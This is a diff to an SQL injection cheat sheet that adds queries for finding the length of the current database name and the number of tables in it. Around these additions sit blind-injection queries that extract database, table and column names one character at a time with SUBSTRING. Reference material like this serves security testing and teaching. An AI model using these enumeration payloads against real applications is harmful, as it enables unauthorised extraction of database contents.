@@ -151,6 +151,10 @@ This type of SQLi triggers an out-of-band network connection to a system control
 ```sql  
 SELECT SUBSTRING((SELECT DATABASE()),1,1);  
 ```
+**Find length of current db:**  
+```sql  
+SELECT LENGTH((SELECT DATABASE()));
+```
 **Display All Databases:**  
 ```sql 
 SELECT SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 4),1,1);  
@@ -159,6 +163,11 @@ SELECT SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OF
 ```sql 
 SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 10),1,1);  
 ```
+**Find number of tables present in current db:**  
+```
+SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE();
+```
+
 **Find Column Names:**  
 ```sql 
 SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 3),1,1);  
